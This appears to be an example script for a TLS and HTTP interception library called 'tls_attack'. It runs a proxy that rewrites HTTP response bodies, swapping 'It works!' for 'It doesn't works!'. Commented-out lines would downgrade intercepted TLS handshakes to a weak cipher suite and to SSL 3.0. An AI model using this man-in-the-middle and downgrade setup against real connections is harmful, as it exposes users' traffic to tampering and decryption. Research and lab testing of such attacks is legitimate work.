import logging
import sys
import time

from tls_attack.proxy.HTTPSProxyServer import HTTPSProxyServer
from tls_attack.proxy.HTTPProxyServer import HTTPProxyServer
from tls_attack.module.AlterHandshake import *
from tls_attack.structure.TLSCipherSuiteStruct import *

def packet_received(connection_id, tls_object, state, source):
    print(tls_object)
    time.sleep(0.5)

def url_response(request, response):
    response_body = response.body

    print("Received body !")
    print(response_body)

    if len(response_body) > 0:
        response_body = response_body.replace(b"It works!", b"It doesn't works!")
        return response.replace_body(response_body)


logging.basicConfig(stream=sys.stdout, level=logging.INFO)

server = HTTPProxyServer(port = 8080)
server.on_url_response(url_response)
server.start()

#server = HTTPSProxyServer(port = 8443)
#server.on_packet_received(packet_received)

#alter_module = AlterHandshake(server)
#alter_module.downgrade_cipher(TLSCipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA)
#alter_module.downgrade_tls_version(0x0300)
#alter_module.start()

#server.start()